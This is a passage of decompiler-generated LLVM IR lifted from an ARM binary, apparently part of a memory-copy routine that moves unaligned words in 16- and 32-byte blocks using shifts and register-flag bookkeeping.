dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b68, %dec_label_pc_14b28, %dec_label_pc_14b74
  %v1_14b80 = phi i32 [ %v4_14b80, %dec_label_pc_14b74 ], [ %v12_14b5c, %dec_label_pc_14b68 ], [ %v0_14b5c75, %dec_label_pc_14b28 ]
  %v0_14b74 = load i32, i32* @lr, align 4
  %v3_14b74 = udiv i32 %v0_14b74, 256
  store i32 %v3_14b74, i32* %ip.global-to-local, align 4
  %v0_14b78 = load i32, i32* %r1.global-to-local, align 4
  %v1_14b78 = inttoptr i32 %v0_14b78 to i32*
  %v2_14b78 = load i32, i32* %v1_14b78, align 4
  store i32 %v2_14b78, i32* @lr, align 4
  %v4_14b78 = add i32 %v0_14b78, 4
  store i32 %v4_14b78, i32* %r1.global-to-local, align 4
  %v4_14b7c = mul i32 %v2_14b78, 16777216
  %v5_14b7c = or i32 %v4_14b7c, %v3_14b74
  store i32 %v5_14b7c, i32* @ip, align 4
  %v2_14b80 = inttoptr i32 %v1_14b80 to i32*
  store i32 %v5_14b7c, i32* %v2_14b80, align 4
  %v3_14b80 = load i32, i32* %r0.global-to-local, align 4
  %v4_14b80 = add i32 %v3_14b80, 4
  store i32 %v4_14b80, i32* %r0.global-to-local, align 4
  %v0_14b84 = load i32, i32* %r2.global-to-local, align 4
  %v2_14b84 = add i32 %v0_14b84, -4
  store i32 %v2_14b84, i32* %r2.global-to-local, align 4
  %v6_14b88 = icmp slt i32 %v0_14b84, 4
  br i1 %v6_14b88, label %dec_label_pc_14b8c.loopexit, label %dec_label_pc_14b74

dec_label_pc_14b8c.loopexit:                      ; preds = %dec_label_pc_14b74
  %v4_14b84 = sub i32 3, %v0_14b84
  %v5_14b84 = and i32 %v4_14b84, %v0_14b84
  %v6_14b84 = icmp slt i32 %v5_14b84, 0
  %v7_14b84 = icmp slt i32 %v2_14b84, 0
  store i1 %v6_14b84, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14b84, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14b8c

dec_label_pc_14b8c:                               ; preds = %dec_label_pc_14b8c.loopexit, %dec_label_pc_14b68
  %v2_14acc113 = phi i32 [ %v4_14b80, %dec_label_pc_14b8c.loopexit ], [ %v12_14b5c, %dec_label_pc_14b68 ]
  %v0_14abc109 = phi i32 [ %v2_14b84, %dec_label_pc_14b8c.loopexit ], [ %v2_14b6c, %dec_label_pc_14b68 ]
  %v0_14b8c = load i32, i32* %r1.global-to-local, align 4
  %v1_14b8c = add i32 %v0_14b8c, -3
  store i32 %v1_14b8c, i32* @r1, align 4
  br label %bb133

dec_label_pc_14b94:                               ; preds = %dec_label_pc_14b14
  br i1 %v5_14c04, label %dec_label_pc_14be0, label %dec_label_pc_14b9c

dec_label_pc_14b9c:                               ; preds = %dec_label_pc_14b94
  store i32 %v2_14c00, i32* %r2.global-to-local, align 4
  %v3_14ba0 = load i32, i32* @r4, align 4
  store i32 %v3_14ba0, i32* %stack_var_-16, align 4
  %v6_14ba0 = load i32, i32* @r5, align 4
  store i32 %v6_14ba0, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14ba4

dec_label_pc_14ba4:                               ; preds = %dec_label_pc_14ba4.dec_label_pc_14ba4_crit_edge, %dec_label_pc_14b9c
  %v0_14bc8 = phi i32 [ %v12_14bc8, %dec_label_pc_14ba4.dec_label_pc_14ba4_crit_edge ], [ %v0_14b5c75, %dec_label_pc_14b9c ]
  %v0_14ba8 = phi i32 [ %v0_14ba8.pre, %dec_label_pc_14ba4.dec_label_pc_14ba4_crit_edge ], [ %v4_14b18, %dec_label_pc_14b9c ]
  %v0_14ba4 = phi i32 [ %v0_14ba4.pre, %dec_label_pc_14ba4.dec_label_pc_14ba4_crit_edge ], [ %v2_14b18, %dec_label_pc_14b9c ]
  %v3_14ba4 = udiv i32 %v0_14ba4, 65536
  store i32 %v3_14ba4, i32* %r3.global-to-local, align 4
  %v1_14ba8 = inttoptr i32 %v0_14ba8 to i32*
  %v2_14ba8 = load i32, i32* %v1_14ba8, align 4
  store i32 %v2_14ba8, i32* %r4.global-to-local, align 4
  %v3_14ba8 = add i32 %v0_14ba8, 4
  %v4_14ba8 = inttoptr i32 %v3_14ba8 to i32*
  %v5_14ba8 = load i32, i32* %v4_14ba8, align 4
  store i32 %v5_14ba8, i32* %r5.global-to-local, align 4
  %v6_14ba8 = add i32 %v0_14ba8, 8
  %v7_14ba8 = inttoptr i32 %v6_14ba8 to i32*
  %v8_14ba8 = load i32, i32* %v7_14ba8, align 4
  store i32 %v8_14ba8, i32* %ip.global-to-local, align 4
  %v9_14ba8 = add i32 %v0_14ba8, 12
  %v10_14ba8 = inttoptr i32 %v9_14ba8 to i32*
  %v11_14ba8 = load i32, i32* %v10_14ba8, align 4
  store i32 %v11_14ba8, i32* @lr, align 4
  %v12_14ba8 = add i32 %v0_14ba8, 16
  store i32 %v12_14ba8, i32* %r1.global-to-local, align 4
  %v4_14bac = mul i32 %v2_14ba8, 65536
  %v5_14bac = or i32 %v4_14bac, %v3_14ba4
  store i32 %v5_14bac, i32* %r3.global-to-local, align 4
  %v3_14bb0 = udiv i32 %v2_14ba8, 65536
  %v4_14bb4 = mul i32 %v5_14ba8, 65536
  %v5_14bb4 = or i32 %v4_14bb4, %v3_14bb0
  store i32 %v5_14bb4, i32* %r4.global-to-local, align 4
  %v3_14bb8 = udiv i32 %v5_14ba8, 65536
  %v4_14bbc = mul i32 %v8_14ba8, 65536
  %v5_14bbc = or i32 %v4_14bbc, %v3_14bb8
  store i32 %v5_14bbc, i32* %r5.global-to-local, align 4
  %v3_14bc0 = udiv i32 %v8_14ba8, 65536
  %v4_14bc4 = mul i32 %v11_14ba8, 65536
  %v5_14bc4 = or i32 %v4_14bc4, %v3_14bc0
  store i32 %v5_14bc4, i32* @ip, align 4
  %v1_14bc8 = inttoptr i32 %v0_14bc8 to i32*
  store i32 %v5_14bac, i32* %v1_14bc8, align 4
  %v3_14bc8 = add i32 %v0_14bc8, 4
  %v4_14bc8 = inttoptr i32 %v3_14bc8 to i32*
  %v5_14bc8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14bc8, i32* %v4_14bc8, align 4
  %v6_14bc8 = add i32 %v0_14bc8, 8
  %v7_14bc8 = inttoptr i32 %v6_14bc8 to i32*
  %v8_14bc8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14bc8, i32* %v7_14bc8, align 4
  %v9_14bc8 = add i32 %v0_14bc8, 12
  %v10_14bc8 = inttoptr i32 %v9_14bc8 to i32*
  %v11_14bc8 = load i32, i32* @ip, align 4
  store i32 %v11_14bc8, i32* %v10_14bc8, align 4
  %v12_14bc8 = add i32 %v0_14bc8, 16
  store i32 %v12_14bc8, i32* %r0.global-to-local, align 4
  %v0_14bcc = load i32, i32* %r2.global-to-local, align 4
  %v2_14bcc = add i32 %v0_14bcc, -16
  store i32 %v2_14bcc, i32* %r2.global-to-local, align 4
  %v6_14bd0 = icmp slt i32 %v0_14bcc, 16
  br i1 %v6_14bd0, label %dec_label_pc_14bd4, label %dec_label_pc_14ba4.dec_label_pc_14ba4_crit_edge

dec_label_pc_14ba4.dec_label_pc_14ba4_crit_edge:  ; preds = %dec_label_pc_14ba4
  %v0_14ba4.pre = load i32, i32* @lr, align 4
  %v0_14ba8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14ba4

dec_label_pc_14bd4:                               ; preds = %dec_label_pc_14ba4
  %v2_14bd4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14bd4, i32* @r4, align 4
  %v5_14bd4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14bd4, i32* @r5, align 4
  %v2_14bd8 = add i32 %v0_14bcc, -4
  store i32 %v2_14bd8, i32* %r2.global-to-local, align 4
  %v4_14bd8 = add i32 %v0_14bcc, 2147483632
  %v5_14bd8 = and i32 %v2_14bd8, %v4_14bd8
  %v6_14bd8 = icmp slt i32 %v5_14bd8, 0
  store i1 %v6_14bd8, i1* %cpsr_v.global-to-local, align 1
  %v7_14bd8 = icmp slt i32 %v2_14bd8, 0
  store i1 %v7_14bd8, i1* %cpsr_n.global-to-local, align 1
  %v5_14bdc = icmp slt i32 %v2_14bcc, -12
  br i1 %v5_14bdc, label %dec_label_pc_14bf8, label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bd4, %dec_label_pc_14b94, %dec_label_pc_14be0
  %v1_14bec = phi i32 [ %v4_14bec, %dec_label_pc_14be0 ], [ %v12_14bc8, %dec_label_pc_14bd4 ], [ %v0_14b5c75, %dec_label_pc_14b94 ]
  %v0_14be0 = load i32, i32* @lr, align 4
  %v3_14be0 = udiv i32 %v0_14be0, 65536
  store i32 %v3_14be0, i32* %ip.global-to-local, align 4
  %v0_14be4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14be4 = inttoptr i32 %v0_14be4 to i32*
  %v2_14be4 = load i32, i32* %v1_14be4, align 4
  store i32 %v2_14be4, i32* @lr, align 4
  %v4_14be4 = add i32 %v0_14be4, 4
  store i32 %v4_14be4, i32* %r1.global-to-local, align 4
  %v4_14be8 = mul i32 %v2_14be4, 65536
  %v5_14be8 = or i32 %v4_14be8, %v3_14be0
  store i32 %v5_14be8, i32* @ip, align 4
  %v2_14bec = inttoptr i32 %v1_14bec to i32*
  store i32 %v5_14be8, i32* %v2_14bec, align 4
  %v3_14bec = load i32, i32* %r0.global-to-local, align 4
  %v4_14bec = add i32 %v3_14bec, 4
  store i32 %v4_14bec, i32* %r0.global-to-local, align 4
  %v0_14bf0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14bf0 = add i32 %v0_14bf0, -4
  store i32 %v2_14bf0, i32* %r2.global-to-local, align 4
  %v6_14bf4 = icmp slt i32 %v0_14bf0, 4
  br i1 %v6_14bf4, label %dec_label_pc_14bf8.loopexit, label %dec_label_pc_14be0

dec_label_pc_14bf8.loopexit:                      ; preds = %dec_label_pc_14be0
  %v4_14bf0 = sub i32 3, %v0_14bf0
  %v5_14bf0 = and i32 %v4_14bf0, %v0_14bf0
  %v6_14bf0 = icmp slt i32 %v5_14bf0, 0
  %v7_14bf0 = icmp slt i32 %v2_14bf0, 0
  store i1 %v6_14bf0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14bf0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %dec_label_pc_14bf8.loopexit, %dec_label_pc_14bd4
  %v2_14acc112 = phi i32 [ %v4_14bec, %dec_label_pc_14bf8.loopexit ], [ %v12_14bc8, %dec_label_pc_14bd4 ]
  %v0_14abc108 = phi i32 [ %v2_14bf0, %dec_label_pc_14bf8.loopexit ], [ %v2_14bd8, %dec_label_pc_14bd4 ]
  %v0_14bf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14bf8 = add i32 %v0_14bf8, -2
  store i32 %v1_14bf8, i32* @r1, align 4
  br label %bb133

dec_label_pc_14c00:                               ; preds = %dec_label_pc_14b14
  br i1 %v5_14c04, label %dec_label_pc_14c4c, label %dec_label_pc_14c08

dec_label_pc_14c08:                               ; preds = %dec_label_pc_14c00
  store i32 %v2_14c00, i32* %r2.global-to-local, align 4
  %v3_14c0c = load i32, i32* @r4, align 4
  store i32 %v3_14c0c, i32* %stack_var_-16, align 4
  %v6_14c0c = load i32, i32* @r5, align 4
  store i32 %v6_14c0c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14c10

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14c10.dec_label_pc_14c10_crit_edge, %dec_label_pc_14c08
  %v0_14c34 = phi i32 [ %v12_14c34, %dec_label_pc_14c10.dec_label_pc_14c10_crit_edge ], [ %v0_14b5c75, %dec_label_pc_14c08 ]
  %v0_14c14 = phi i32 [ %v0_14c14.pre, %dec_label_pc_14c10.dec_label_pc_14c10_crit_edge ], [ %v4_14b18, %dec_label_pc_14c08 ]
  %v0_14c10 = phi i32 [ %v0_14c10.pre, %dec_label_pc_14c10.dec_label_pc_14c10_crit_edge ], [ %v2_14b18, %dec_label_pc_14c08 ]
  %v3_14c10 = udiv i32 %v0_14c10, 16777216
  store i32 %v3_14c10, i32* %r3.global-to-local, align 4
  %v1_14c14 = inttoptr i32 %v0_14c14 to i32*
  %v2_14c14 = load i32, i32* %v1_14c14, align 4
  store i32 %v2_14c14, i32* %r4.global-to-local, align 4
  %v3_14c14 = add i32 %v0_14c14, 4
  %v4_14c14 = inttoptr i32 %v3_14c14 to i32*
  %v5_14c14 = load i32, i32* %v4_14c14, align 4
  store i32 %v5_14c14, i32* %r5.global-to-local, align 4
  %v6_14c14 = add i32 %v0_14c14, 8
  %v7_14c14 = inttoptr i32 %v6_14c14 to i32*
  %v8_14c14 = load i32, i32* %v7_14c14, align 4
  store i32 %v8_14c14, i32* %ip.global-to-local, align 4
  %v9_14c14 = add i32 %v0_14c14, 12
  %v10_14c14 = inttoptr i32 %v9_14c14 to i32*
  %v11_14c14 = load i32, i32* %v10_14c14, align 4
  store i32 %v11_14c14, i32* @lr, align 4
  %v12_14c14 = add i32 %v0_14c14, 16
  store i32 %v12_14c14, i32* %r1.global-to-local, align 4
  %v4_14c18 = mul i32 %v2_14c14, 256
  %v5_14c18 = or i32 %v4_14c18, %v3_14c10
  store i32 %v5_14c18, i32* %r3.global-to-local, align 4
  %v3_14c1c = udiv i32 %v2_14c14, 16777216
  %v4_14c20 = mul i32 %v5_14c14, 256
  %v5_14c20 = or i32 %v4_14c20, %v3_14c1c
  store i32 %v5_14c20, i32* %r4.global-to-local, align 4
  %v3_14c24 = udiv i32 %v5_14c14, 16777216
  %v4_14c28 = mul i32 %v8_14c14, 256
  %v5_14c28 = or i32 %v4_14c28, %v3_14c24
  store i32 %v5_14c28, i32* %r5.global-to-local, align 4
  %v3_14c2c = udiv i32 %v8_14c14, 16777216
  %v4_14c30 = mul i32 %v11_14c14, 256
  %v5_14c30 = or i32 %v4_14c30, %v3_14c2c
  store i32 %v5_14c30, i32* @ip, align 4
  %v1_14c34 = inttoptr i32 %v0_14c34 to i32*
  store i32 %v5_14c18, i32* %v1_14c34, align 4
  %v3_14c34 = add i32 %v0_14c34, 4
  %v4_14c34 = inttoptr i32 %v3_14c34 to i32*
  %v5_14c34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14c34, i32* %v4_14c34, align 4
  %v6_14c34 = add i32 %v0_14c34, 8
  %v7_14c34 = inttoptr i32 %v6_14c34 to i32*
  %v8_14c34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14c34, i32* %v7_14c34, align 4
  %v9_14c34 = add i32 %v0_14c34, 12
  %v10_14c34 = inttoptr i32 %v9_14c34 to i32*
  %v11_14c34 = load i32, i32* @ip, align 4
  store i32 %v11_14c34, i32* %v10_14c34, align 4
  %v12_14c34 = add i32 %v0_14c34, 16
  store i32 %v12_14c34, i32* %r0.global-to-local, align 4
  %v0_14c38 = load i32, i32* %r2.global-to-local, align 4
  %v2_14c38 = add i32 %v0_14c38, -16
  store i32 %v2_14c38, i32* %r2.global-to-local, align 4
  %v6_14c3c = icmp slt i32 %v0_14c38, 16
  br i1 %v6_14c3c, label %dec_label_pc_14c40, label %dec_label_pc_14c10.dec_label_pc_14c10_crit_edge

dec_label_pc_14c10.dec_label_pc_14c10_crit_edge:  ; preds = %dec_label_pc_14c10
  %v0_14c10.pre = load i32, i32* @lr, align 4
  %v0_14c14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14c10

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14c10
  %v2_14c40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14c40, i32* @r4, align 4
  %v5_14c40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14c40, i32* @r5, align 4
  %v2_14c44 = add i32 %v0_14c38, -4
  store i32 %v2_14c44, i32* %r2.global-to-local, align 4
  %v4_14c44 = add i32 %v0_14c38, 2147483632
  %v5_14c44 = and i32 %v2_14c44, %v4_14c44
  %v6_14c44 = icmp slt i32 %v5_14c44, 0
  store i1 %v6_14c44, i1* %cpsr_v.global-to-local, align 1
  %v7_14c44 = icmp slt i32 %v2_14c44, 0
  store i1 %v7_14c44, i1* %cpsr_n.global-to-local, align 1
  %v5_14c48 = icmp slt i32 %v2_14c38, -12
  br i1 %v5_14c48, label %dec_label_pc_14c64, label %dec_label_pc_14c4c

dec_label_pc_14c4c:                               ; preds = %dec_label_pc_14c40, %dec_label_pc_14c00, %dec_label_pc_14c4c
  %v1_14c58 = phi i32 [ %v4_14c58, %dec_label_pc_14c4c ], [ %v12_14c34, %dec_label_pc_14c40 ], [ %v0_14b5c75, %dec_label_pc_14c00 ]
  %v0_14c4c = load i32, i32* @lr, align 4
  %v3_14c4c = udiv i32 %v0_14c4c, 16777216
  store i32 %v3_14c4c, i32* %ip.global-to-local, align 4
  %v0_14c50 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c50 = inttoptr i32 %v0_14c50 to i32*
  %v2_14c50 = load i32, i32* %v1_14c50, align 4
  store i32 %v2_14c50, i32* @lr, align 4
  %v4_14c50 = add i32 %v0_14c50, 4
  store i32 %v4_14c50, i32* %r1.global-to-local, align 4
  %v4_14c54 = mul i32 %v2_14c50, 256
  %v5_14c54 = or i32 %v4_14c54, %v3_14c4c
  store i32 %v5_14c54, i32* @ip, align 4
  %v2_14c58 = inttoptr i32 %v1_14c58 to i32*
  store i32 %v5_14c54, i32* %v2_14c58, align 4
  %v3_14c58 = load i32, i32* %r0.global-to-local, align 4
  %v4_14c58 = add i32 %v3_14c58, 4
  store i32 %v4_14c58, i32* %r0.global-to-local, align 4
  %v0_14c5c = load i32, i32* %r2.global-to-local, align 4
  %v2_14c5c = add i32 %v0_14c5c, -4
  store i32 %v2_14c5c, i32* %r2.global-to-local, align 4
  %v6_14c60 = icmp slt i32 %v0_14c5c, 4
  br i1 %v6_14c60, label %dec_label_pc_14c64.loopexit, label %dec_label_pc_14c4c

dec_label_pc_14c64.loopexit:                      ; preds = %dec_label_pc_14c4c
  %v4_14c5c = sub i32 3, %v0_14c5c
  %v5_14c5c = and i32 %v4_14c5c, %v0_14c5c
  %v6_14c5c = icmp slt i32 %v5_14c5c, 0
  %v7_14c5c = icmp slt i32 %v2_14c5c, 0
  store i1 %v6_14c5c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14c5c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14c64

dec_label_pc_14c64:                               ; preds = %dec_label_pc_14c64.loopexit, %dec_label_pc_14c40
  %v2_14acc114 = phi i32 [ %v4_14c58, %dec_label_pc_14c64.loopexit ], [ %v12_14c34, %dec_label_pc_14c40 ]
  %v0_14abc110 = phi i32 [ %v2_14c5c, %dec_label_pc_14c64.loopexit ], [ %v2_14c44, %dec_label_pc_14c40 ]
  %v0_14c64 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c64 = add i32 %v0_14c64, -1
  store i32 %v1_14c64, i32* @r1, align 4
  br label %bb133

dec_label_pc_14c6c:                               ; preds = %entry
  %v1_14c6c = load i32, i32* @r2, align 4
  %v2_14c6c = add i32 %v1_14c6c, %v0_14a20
  store i32 %v2_14c6c, i32* @r1, align 4
  %v2_14c70 = add i32 %v1_14c6c, %v1_14a20
  store i32 %v2_14c70, i32* %r0.global-to-local, align 4
  %v2_14c74 = add i32 %v1_14c6c, -4
  store i32 %v2_14c74, i32* %r2.global-to-local, align 4
  %v4_14c74 = sub i32 3, %v1_14c6c
  %v5_14c74 = and i32 %v4_14c74, %v1_14c6c
  %v6_14c74 = icmp slt i32 %v5_14c74, 0
  store i1 %v6_14c74, i1* %cpsr_v.global-to-local, align 1
  %v7_14c74 = icmp slt i32 %v2_14c74, 0
  store i1 %v7_14c74, i1* %cpsr_n.global-to-local, align 1
  %v5_14c78 = icmp slt i32 %v1_14c6c, 4
  br i1 %v5_14c78, label %bb143, label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %dec_label_pc_14c6c
  %v1_14c7c = urem i32 %v2_14c70, 4
  store i32 %v1_14c7c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14c7c = icmp eq i32 %v1_14c7c, 0
  br i1 %v2_14c7c, label %dec_label_pc_14c84, label %dec_label_pc_14d24

dec_label_pc_14c84:                               ; preds = %dec_label_pc_14c7c
  %v1_14c84 = urem i32 %v2_14c6c, 4
  store i32 %v1_14c84, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14c84 = icmp eq i32 %v1_14c84, 0
  br i1 %v2_14c84, label %dec_label_pc_14c8c, label %dec_label_pc_14d50

dec_label_pc_14c8c:                               ; preds = %dec_label_pc_14c84, %dec_label_pc_14d48
  %v0_14ca449 = phi i32 [ %v2_14c70, %dec_label_pc_14c84 ], [ %v0_14d9832, %dec_label_pc_14d48 ]
  %v0_14ca048 = phi i32 [ %v2_14c6c, %dec_label_pc_14c84 ], [ %v0_14d48, %dec_label_pc_14d48 ]
  %v0_14c8c = phi i32 [ %v2_14c74, %dec_label_pc_14c84 ], [ %v2_14d40, %dec_label_pc_14d48 ]
  %v2_14c8c = add i32 %v0_14c8c, -8
  store i32 %v2_14c8c, i32* %r2.global-to-local, align 4
  %v4_14c8c = sub i32 7, %v0_14c8c
  %v5_14c8c = and i32 %v4_14c8c, %v0_14c8c
  %v6_14c8c = icmp slt i32 %v5_14c8c, 0
  store i1 %v6_14c8c, i1* %cpsr_v.global-to-local, align 1
  %v7_14c8c = icmp slt i32 %v2_14c8c, 0
  store i1 %v7_14c8c, i1* %cpsr_n.global-to-local, align 1
  %v5_14c90 = icmp slt i32 %v0_14c8c, 8
  br i1 %v5_14c90, label %dec_label_pc_14cdc, label %dec_label_pc_14c94

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c8c
  %v3_14c94 = load i32, i32* @r4, align 4
  %v5_14c94 = inttoptr i32 %v3_14c94 to i8*
  store i8* %v5_14c94, i8** %stack_var_-8, align 4
  %v8_14c94 = load i32, i32* @lr, align 4
  %v2_14c98 = add i32 %v0_14c8c, -28
  store i32 %v2_14c98, i32* %r2.global-to-local, align 4
  %v4_14c98 = sub i32 27, %v0_14c8c
  %v5_14c98 = and i32 %v4_14c98, %v2_14c8c
  %v6_14c98 = icmp slt i32 %v5_14c98, 0
  store i1 %v6_14c98, i1* %cpsr_v.global-to-local, align 1
  %v7_14c98 = icmp slt i32 %v2_14c98, 0
  store i1 %v7_14c98, i1* %cpsr_n.global-to-local, align 1
  %v5_14c9c = icmp slt i32 %v2_14c8c, 20
  br i1 %v5_14c9c, label %dec_label_pc_14cb8, label %dec_label_pc_14ca0

dec_label_pc_14ca0:                               ; preds = %dec_label_pc_14c94, %dec_label_pc_14ca0.dec_label_pc_14ca0_crit_edge
  %v0_14ca4 = phi i32 [ %v1_14cac, %dec_label_pc_14ca0.dec_label_pc_14ca0_crit_edge ], [ %v0_14ca449, %dec_label_pc_14c94 ]
  %v0_14ca0 = phi i32 [ %v0_14ca0.pre, %dec_label_pc_14ca0.dec_label_pc_14ca0_crit_edge ], [ %v0_14ca048, %dec_label_pc_14c94 ]
  %v1_14ca0 = add i32 %v0_14ca0, -4
  %v2_14ca0 = inttoptr i32 %v1_14ca0 to i32*
  %v3_14ca0 = load i32, i32* %v2_14ca0, align 4
  store i32 %v3_14ca0, i32* %r3.global-to-local, align 4
  %v4_14ca0 = add i32 %v0_14ca0, -8
  %v5_14ca0 = inttoptr i32 %v4_14ca0 to i32*
  %v6_14ca0 = load i32, i32* %v5_14ca0, align 4
  store i32 %v6_14ca0, i32* %r4.global-to-local, align 4
  %v7_14ca0 = add i32 %v0_14ca0, -12
  %v8_14ca0 = inttoptr i32 %v7_14ca0 to i32*
  %v9_14ca0 = load i32, i32* %v8_14ca0, align 4
  store i32 %v9_14ca0, i32* %ip.global-to-local, align 4
  %v10_14ca0 = add i32 %v0_14ca0, -16
  %v11_14ca0 = inttoptr i32 %v10_14ca0 to i32*
  %v12_14ca0 = load i32, i32* %v11_14ca0, align 4
  store i32 %v12_14ca0, i32* %lr.global-to-local, align 4
  store i32 %v10_14ca0, i32* %r1.global-to-local, align 4
  %v1_14ca4 = add i32 %v0_14ca4, -16
  %v2_14ca4 = inttoptr i32 %v1_14ca4 to i32*
  store i32 %v3_14ca0, i32* %v2_14ca4, align 4
  %v4_14ca4 = add i32 %v0_14ca4, -12
  %v5_14ca4 = inttoptr i32 %v4_14ca4 to i32*
  %v6_14ca4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14ca4, i32* %v5_14ca4, align 4
  %v7_14ca4 = add i32 %v0_14ca4, -8
  %v8_14ca4 = inttoptr i32 %v7_14ca4 to i32*
  %v9_14ca4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_14ca4, i32* %v8_14ca4, align 4
  %v10_14ca4 = add i32 %v0_14ca4, -4
  %v11_14ca4 = inttoptr i32 %v10_14ca4 to i32*
  %v12_14ca4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14ca4, i32* %v11_14ca4, align 4
  store i32 %v1_14ca4, i32* %r0.global-to-local, align 4
  %v0_14ca8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ca8 = add i32 %v0_14ca8, -4
  %v2_14ca8 = inttoptr i32 %v1_14ca8 to i32*
  %v3_14ca8 = load i32, i32* %v2_14ca8, align 4
  store i32 %v3_14ca8, i32* %r3.global-to-local, align 4
  %v4_14ca8 = add i32 %v0_14ca8, -8
  %v5_14ca8 = inttoptr i32 %v4_14ca8 to i32*
  %v6_14ca8 = load i32, i32* %v5_14ca8, align 4
  store i32 %v6_14ca8, i32* %r4.global-to-local, align 4
  %v7_14ca8 = add i32 %v0_14ca8, -12
  %v8_14ca8 = inttoptr i32 %v7_14ca8 to i32*
  %v9_14ca8 = load i32, i32* %v8_14ca8, align 4
  store i32 %v9_14ca8, i32* @ip, align 4
  %v10_14ca8 = add i32 %v0_14ca8, -16
  %v11_14ca8 = inttoptr i32 %v10_14ca8 to i32*
  %v12_14ca8 = load i32, i32* %v11_14ca8, align 4
  store i32 %v12_14ca8, i32* %lr.global-to-local, align 4
  store i32 %v10_14ca8, i32* @r1, align 4
  %v1_14cac = add i32 %v0_14ca4, -32
  %v2_14cac = inttoptr i32 %v1_14cac to i32*
  store i32 %v3_14ca8, i32* %v2_14cac, align 4
  %v4_14cac = add i32 %v0_14ca4, -28
  %v5_14cac = inttoptr i32 %v4_14cac to i32*
  %v6_14cac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14cac, i32* %v5_14cac, align 4
  %v7_14cac = add i32 %v0_14ca4, -24
  %v8_14cac = inttoptr i32 %v7_14cac to i32*
  %v9_14cac = load i32, i32* @ip, align 4
  store i32 %v9_14cac, i32* %v8_14cac, align 4
  %v10_14cac = add i32 %v0_14ca4, -20
  %v11_14cac = inttoptr i32 %v10_14cac to i32*
  %v12_14cac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14cac, i32* %v11_14cac, align 4
  store i32 %v1_14cac, i32* %r0.global-to-local, align 4
  %v0_14cb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14cb0 = add i32 %v0_14cb0, -32
  store i32 %v2_14cb0, i32* %r2.global-to-local, align 4
  %v6_14cb4 = icmp slt i32 %v0_14cb0, 32
  br i1 %v6_14cb4, label %dec_label_pc_14cb8.loopexit, label %dec_label_pc_14ca0.dec_label_pc_14ca0_crit_edge

dec_label_pc_14ca0.dec_label_pc_14ca0_crit_edge:  ; preds = %dec_label_pc_14ca0
  %v0_14ca0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14ca0

dec_label_pc_14cb8.loopexit:                      ; preds = %dec_label_pc_14ca0
  %v4_14cb0 = sub i32 31, %v0_14cb0
  %v5_14cb0 = and i32 %v4_14cb0, %v0_14cb0
  %v6_14cb0 = icmp slt i32 %v5_14cb0, 0
  %v7_14cb0 = icmp slt i32 %v2_14cb0, 0
  store i1 %v6_14cb0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14cb0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14cb8

dec_label_pc_14cb8:                               ; preds = %dec_label_pc_14cb8.loopexit, %dec_label_pc_14c94
  %v6_14cc0 = phi i32 [ %v1_14cac, %dec_label_pc_14cb8.loopexit ], [ %v0_14ca449, %dec_label_pc_14c94 ]
  %v0_14cc8.pr = phi i32 [ %v2_14cb0, %dec_label_pc_14cb8.loopexit ], [ %v2_14c98, %dec_label_pc_14c94 ]
  %v4_14cb8 = add i32 %v0_14cc8.pr, 16
  %v6_14cb8 = sub i32 0, %v0_14cc8.pr
  %v7_14cb8 = and i32 %v4_14cb8, %v6_14cb8
  %v8_14cb8 = icmp slt i32 %v7_14cb8, 0
  store i1 %v8_14cb8, i1* %cpsr_v.global-to-local, align 1
  %v9_14cb8 = icmp slt i32 %v4_14cb8, 0
  store i1 %v9_14cb8, i1* %cpsr_n.global-to-local, align 1
  %v5_14cbc = icmp slt i32 %v0_14cc8.pr, -16
  br i1 %v5_14cbc, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_14cb8
  %v6_14cbc = load i32, i32* @r1, align 4
  %v7_14cbc = add i32 %v6_14cbc, -4
  %v8_14cbc = inttoptr i32 %v7_14cbc to i32*
  %v9_14cbc = load i32, i32* %v8_14cbc, align 4
  store i32 %v9_14cbc, i32* %r3.global-to-local, align 4
  %v10_14cbc = add i32 %v6_14cbc, -8
  %v11_14cbc = inttoptr i32 %v10_14cbc to i32*
  %v12_14cbc = load i32, i32* %v11_14cbc, align 4
